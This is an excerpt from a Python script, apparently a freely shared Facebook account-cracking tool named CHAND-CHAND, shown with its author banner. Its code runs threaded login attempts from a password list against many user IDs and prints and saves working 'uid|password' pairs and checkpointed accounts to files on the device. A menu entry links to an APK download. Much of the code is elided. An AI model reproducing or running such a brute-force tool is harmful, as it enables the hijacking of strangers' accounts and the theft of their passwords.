...
$$ |      $$  __$$ |$$  __$$ |$$ \$$$$ |$$ |  $$ |\033[1;31m 𝐑\033[1;37m
$$ |  $$\ $$ |  $$ |$$ |  $$ |$$ |\$$$ |$$ |  $$ |\033[1;34m𝐏 \033[1;37m
\$$$$$$  |$$ |  $$ |$$ |  $$ |$$ | \$$ |$$$$$$$  |
 \______/ \__|  \__|\__|  \__|\__|  \__|\_______/                                                                                                                                                         
----------------------------------------------
 Author    :  RAFI ULLAH
 Github    : CHAND-TRICKER
 Facebook  : CHAND.SA LARAK
 Tool Name : CHAND-CHAND
 Tool type : FREE
----------------------------------------------
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/CHAND_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
...
def pak():
                ...
                with tred(max_workers=30) as CHAND:     
                        ...
                        for psx in user:
                                ...
                                CHAND.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [CHAND-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/CHAND-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [CHAND-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CHAND-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
